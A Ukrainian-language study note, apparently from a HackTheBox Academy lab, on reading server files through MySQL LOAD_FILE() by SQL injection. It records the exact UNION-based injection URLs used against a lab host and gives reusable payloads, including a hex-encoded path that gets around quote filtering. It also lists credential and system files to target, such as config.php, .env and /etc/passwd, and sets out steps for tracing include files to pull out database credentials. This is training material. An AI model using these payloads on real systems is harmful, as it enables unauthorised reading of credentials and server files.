# SQL Injection — Reading Files (LOAD_FILE)

## Модуль
[SQL Injection Fundamentals — Reading Files](https://academy.hackthebox.com/app/module/33/section/792)

## Концепція

MySQL функція `LOAD_FILE()` дозволяє читати файли з сервера якщо:
- Юзер має привілей `FILE`
- Файл доступний для читання

## Виконані кроки

### Крок 1 — Знайти datadir (шлях до MySQL)
http://154.57.164.82:31182/search.php?port_code=cn' UNION select 1,@@datadir,3,4-- -

### Крок 2 — Прочитати search.php (знайти include)
http://154.57.164.82:31182/search.php?port_code=cn' UNION select 1,LOAD_FILE('/var/www/html/search.php'),3,4-- -

### Крок 3 — Прочитати config.php
http://154.57.164.82:31182/search.php?port_code=cn' UNION select 1,LOAD_FILE('/var/www/html/config.php'),3,4-- -

**Відповідь:** `dB_pAssw0rd_iS_flag!`

---

## Корисні файли для читання

| Файл | Що містить |
|------|-----------|
| `/var/www/html/config.php` | DB credentials |
| `/var/www/html/conn.php` | DB connection |
| `/var/www/html/.env` | Environment змінні |
| `/etc/passwd` | Системні юзери |
| `/etc/hosts` | Hosts файл |
| `/proc/self/environ` | Змінні середовища процесу |
| `C:/Windows/System32/drivers/etc/hosts` | Windows hosts |
| `C:/xampp/htdocs/config.php` | Windows XAMPP config |

## LOAD_FILE payload

```sql
-- Базовий
' UNION select 1,LOAD_FILE('/etc/passwd'),3,4-- -

-- Config файл
' UNION select 1,LOAD_FILE('/var/www/html/config.php'),3,4-- -

-- Через hex (якщо лапки фільтруються)
' UNION select 1,LOAD_FILE(0x2f6574632f706173737764),3,4-- -
```

## Алгоритм пошуку include файлів
1 Прочитати основний PHP файл через LOAD_FILE
2 Знайти рядок include/require:
include('config.php')
require_once('../conn.php')
3 Прочитати знайдений файл
4 Витягнути credentials

## Перевірка FILE привілею

```sql
-- Варіант 1
' UNION select 1,super_priv,3,4
FROM information_schema.user_privileges
WHERE grantee="'root'@'localhost'"-- -

-- Варіант 2 (якщо super_priv не існує)
' UNION select 1,LOAD_FILE('/etc/passwd'),3,4-- -
-- якщо повертає дані — FILE privilege є
```
